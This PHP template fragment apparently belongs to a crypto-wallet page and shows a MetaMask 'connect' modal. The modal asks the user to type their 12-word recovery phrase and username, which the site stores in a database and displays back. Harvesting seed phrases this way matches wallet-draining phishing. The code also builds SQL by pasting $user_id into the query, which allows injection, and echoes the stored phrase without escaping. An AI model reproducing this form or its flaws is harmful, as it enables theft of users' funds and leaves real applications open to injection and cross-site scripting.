<?php

$sql = "SELECT * FROM wallet WHERE wallet_owner_id = $user_id AND wallet_id = 1";
$result = $conn->query($sql);
$row = $result->fetch_assoc();
$wallet_id = $row['wallet_id'];
$wallet_ref_id = $row['wallet_ref_id'];
$wallet_phase = $row['wallet_phase'];
$wallet_owner_id = $row['wallet_owner_id'];
$wallet_username = $row['wallet_username'];
$wallet_img = $row['wallet_img'];
$wallet_name = $row['wallet_name'];
$wallet_key = $row['wallet_key']; // name of wallet 1=>metamask, 2=>binance, 3=>coinbase, 4=>walletConnect
$wallet_status = $row['wallet_status']; // 0=not connected 1=connected 2=pending approval

?>
<?php if ($wallet_status == 0) { ?>
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">

                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask</h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="input">Meta Mask 12 Phase</label>
                            <input type="text" class="form-control" name="wallet_phase"
                                   placeholder="Enter Wallet Phase">
                        </div>
                        <div class="form-group">
                            <label for="input2">Meta Mask Username</label>
                            <input type="text" class="form-control" name="wallet_username"
                                   placeholder="Metamask UserName">
                        </div>
                        <button type="submit" class="btn btn-primary" name="meta_mask">Submit</button>
                    </form>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } elseif ($wallet_status == 1) { ?>
    <!-- The Modal -->
    <div class="modal fade" id="metaMask">
        <div class="modal-dialog modal-dialog-centered">
            <div class="modal-content">
<?php
if ($wallet_status == 1){
    $wallet_status = 'connected';
}elseif($wallet_status == 2){
    $wallet_status = 'pending approval';
}elseif($wallet_status == 0){
    $wallet_status = 'not connected';
}
?>
                <!-- Modal Header -->
                <div class="modal-header">
                    <h4 class="modal-title">Meta Mask<span
                            class="p-2 text-success bg-dark"><?= $wallet_status?></span></h4>
                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                </div>

                <!-- Modal Body -->
                <div class="modal-body">
                    <div class="p-3 border-1">Your wallet phase</div>
                    <div class="p-3 border-1"><?= $wallet_phase ?></div>
                </div>

                <!-- Modal Footer -->
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                </div>

            </div>
        </div>
    </div>
<?php } ?>
